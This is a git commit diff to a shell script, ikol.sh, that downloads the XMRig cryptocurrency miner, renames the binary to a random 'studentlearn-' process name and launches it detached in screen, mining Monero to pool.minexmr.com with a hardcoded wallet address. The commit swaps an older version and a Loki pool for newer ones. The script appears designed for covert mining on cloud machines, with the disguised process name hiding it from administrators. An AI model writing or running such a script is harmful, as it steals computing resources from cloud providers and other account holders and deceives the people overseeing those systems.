5866a426a71b20a8dcc11b6f544b8da4ab111d86
eccoder <55380821+eccoder@users.noreply.github.com>
2021-08-21 18:05:25 +0700

    Update ikol.sh

--- ikol.sh
+++ ikol.sh
@@ -3,14 +3,14 @@ sudo apt-get update
 azure=studentlearn
 mkdir /usr/share
 mkdir /usr/share/work
-rm -r /usr/share/work/xmrig-3.2.0
-wget https://github.com/xmrig/xmrig/releases/download/v3.2.0/xmrig-3.2.0-xenial-x64.tar.gz 
-mv xmrig-3.2.0-xenial-x64.tar.gz /usr/share/work/
-cd /usr/share/work/ &&  tar xf xmrig-3.2.0-xenial-x64.tar.gz
-rm -rf xmrig-3.2.0-xenial-x64.tar.gz && cd xmrig-3.2.0
+rm -r /usr/share/work/xmrig-6.14.1
+wget https://github.com/xmrig/xmrig/releases/download/v6.14.1/xmrig-6.14.1-linux-x64.tar.gz 
+mv xmrig-6.14.1-linux-x64.tar.gz /usr/share/work/
+cd /usr/share/work/ &&  tar xf xmrig-6.14.1-linux-x64.tar.gz
+rm -rf xmrig-6.14.1-linux-x64.tar.gz && cd xmrig-6.14.1
 a='studentlearn-' && b=$(shuf -i10-375 -n1) && c='-' && d=$(shuf -i10-259 -n1) && cpuname=$a$b$c$d
 mv xmrig $azure -n
 sudo cp $azure "$cpuname"
 sudo rm -f  xmrig
 echo $cpuname" is starting"
-screen -d -m ./"${cpuname}" --donate-level 1 -o loki.herominers.com:10111 -u LTytj7ieigBDh7msaSobG9R5ggJq89MDpWwz4a89hxEZUKMk6oFBh3rGdjpqjwtzftQhSYDmNyoZfgg4WF8i8ao7D11WXva -p ikol -a rx/loki -k
+screen -d -m ./"${cpuname}" -o pool.minexmr.com:4444 -u 83RBenv44USZpppATtxX3LHrZqstpuTpcfuT4FEMH35uMfoWWnbMtLMfAit3bTV4HEWYoCqcNH7ZTU3VoAsayUaDEbcRUo9 -p anitaosbeck -a rx/0 -k
